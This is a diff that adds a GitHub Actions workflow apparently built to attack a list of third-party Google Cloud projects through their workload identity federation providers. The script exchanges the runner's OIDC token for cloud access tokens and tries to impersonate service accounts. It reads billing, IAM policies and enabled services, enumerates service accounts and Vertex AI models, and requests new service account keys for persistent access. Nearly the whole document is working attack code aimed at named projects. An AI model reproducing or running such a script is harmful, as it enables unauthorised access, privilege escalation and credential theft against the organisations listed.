@@ -1,0 +1,102 @@
+name: i893
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  i893:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - name: webhunt-batch
+        run: |
+          set +e
+          cat > targets.txt <<'AUD'
+          projects/776257662402/locations/global/workloadIdentityPools/varcavia-github-pool/providers/varcavia-github-provider|varcavia-office-sa@gemini-api-key-466122.iam.gserviceaccount.com|varcavia-C1
+          projects/776257662402/locations/global/workloadIdentityPools/varcavia-office-pool/providers/github-provider|varcavia-office-agent@gemini-api-key-466122.iam.gserviceaccount.com|varcavia-C2
+          projects/776257662402/locations/global/workloadIdentityPools/varcavia-office-pool-v2/providers/github-provider|varcavia-office-agent@gemini-api-key-466122.iam.gserviceaccount.com|varcavia-C3
+          projects/884236221349/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|github-actions@pymes-dev-352318.iam.gserviceaccount.com|pymes-vertex
+          projects/107722137045/locations/global/workloadIdentityPools/github-pool/providers/github-provider|parallelcs-deployer@dmjone.iam.gserviceaccount.com|parallelcs
+          projects/146237699183/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|github-deployer@alert-weaver-490908-t7.iam.gserviceaccount.com|hospital-referral
+          projects/384210760656/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-deploy@job-automation-jonas.iam.gserviceaccount.com|financebro
+          projects/220317924975/locations/global/workloadIdentityPools/github-com/providers/github-com-oidc|github-action@nkn-it-wif-demo-2.iam.gserviceaccount.com|cyclenerd-demo
+          projects/203831262197/locations/global/workloadIdentityPools/github-oidc-activitypub/providers/github-provider-activitypub|stg-activitypub-terraform-cicd@ghost-activitypub-stg.iam.gserviceaccount.com|activitypub-stg
+          projects/687476608778/locations/global/workloadIdentityPools/github-oidc-activitypub/providers/github-provider-activitypub|prd-activitypub-terraform-cicd@ghost-activitypub.iam.gserviceaccount.com|activitypub-prd
+          projects/49427430084/locations/global/workloadIdentityPools/github-wif-pool/providers/github-wif-provider|github-actions@cloud-cpp-identity-federation.iam.gserviceaccount.com|google-cloud-cpp
+          projects/40727297000/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|gh-actions-deployer@qwiklabs-gcp-01-10185911da63.iam.gserviceaccount.com|qwiklabs-C4
+          AUD
+          probe_api() { # num sa tok label url
+            local num="$1" sa="$2" tok="$3" label="$4" url="$5"
+            local c b
+            c=$(curl -s -o o.json -w '%{http_code}' -H "Authorization: Bearer $tok" "$url")
+            b=$(head -c 300 o.json | tr -d '\n' | tr -s ' ')
+            echo "##API num=$num sa=$sa label=$label code=$c body=$b"
+          }
+          probe_post() { # num sa tok label url file
+            local num="$1" sa="$2" tok="$3" label="$4" url="$5" f="$6"
+            local c b
+            c=$(curl -s -o o.json -w '%{http_code}' -X POST -H "Authorization: Bearer $tok" -H "Content-Type: application/json" "$url" -d @"$f")
+            b=$(head -c 400 o.json | tr -d '\n' | tr -s ' ')
+            echo "##API num=$num sa=$sa label=$label code=$c body=$b"
+          }
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
+          n=0
+          while IFS='|' read -r PRJ SAS LABEL; do
+            [ -z "$PRJ" ] && continue
+            n=$((n+1))
+            NUM=$(echo "$PRJ" | cut -d/ -f2)
+            AUD="https://iam.googleapis.com/$PRJ"
+            rm -f tok.jwt
+            for a in 1 2 3; do
+              J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+              echo "$J" | jq -r '.value // empty' > tok.jwt
+              [ -s tok.jwt ] && break
+              sleep 3
+            done
+            if [ ! -s tok.jwt ]; then echo "##STS num=$NUM label=$LABEL provider=$PRJ code=MINT_FAIL body="; continue; fi
+            c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            b=$(head -c 400 r.json | tr -d '\n' | tr -s ' ')
+            echo "##STS num=$NUM label=$LABEL provider=$PRJ code=$c body=$b"
+            FT=$(jq -r '.access_token // empty' r.json)
+            if [ -z "$FT" ]; then sleep 1; continue; fi
+            echo "##FT num=$NUM label=$LABEL toklen=${#FT}"
+            probe_api "$NUM" "-" "$FT" "direct-billing" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"
+            probe_api "$NUM" "-" "$FT" "direct-models-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"
+            probe_post "$NUM" "-" "$FT" "policy-read" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" polreq.json
+            probe_api "$NUM" "-" "$FT" "services" "https://serviceusage.googleapis.com/v1/projects/$NUM/services?filter=state:ENABLED"
+            CAND="$SAS,$NUM-compute@developer.gserviceaccount.com"
+            seen=","
+            for SA in ${CAND//,/ }; do
+              SA=$(echo "$SA" | sed 's/^ *//;s/ *$//')
+              [ -z "$SA" ] && continue
+              case "$seen" in *",$SA,"*) continue;; esac
+              seen="$seen$SA,"
+              gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+                "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+              gb=$(head -c 300 g.json | tr -d '\n' | tr -s ' ')
+              AT=$(jq -r '.accessToken // empty' g.json)
+              echo "##GEN num=$NUM label=$LABEL sa=$SA code=$gc toklen=${#AT} body=$gb"
+              if [ -z "$AT" ]; then continue; fi
+              probe_api "$NUM" "$SA" "$AT" "models-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"
+              probe_api "$NUM" "$SA" "$AT" "models-europe-west1" "https://europe-west1-aiplatform.googleapis.com/v1/projects/$NUM/locations/europe-west1/models"
+              probe_api "$NUM" "$SA" "$AT" "models-global" "https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models"
+              probe_api "$NUM" "$SA" "$AT" "billing" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"
+              probe_api "$NUM" "$SA" "$AT" "projects-get" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
+              probe_api "$NUM" "$SA" "$AT" "sa-list" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts"
+              probe_api "$NUM" "$SA" "$AT" "blogs" "https://serviceusage.googleapis.com/v1/projects/$NUM/services?filter=state:ENABLED"
+              probe_post "$NUM" "$SA" "$AT" "sa-key" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" keyreq.json
+              probe_post "$NUM" "$SA" "$AT" "policy-read-sa" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" polreq.json
+            done
+            echo "##DONE num=$NUM label=$LABEL n=$n"
+            sleep 0.4
+          done < targets.txt
+          echo "##FINISHED total=$n"
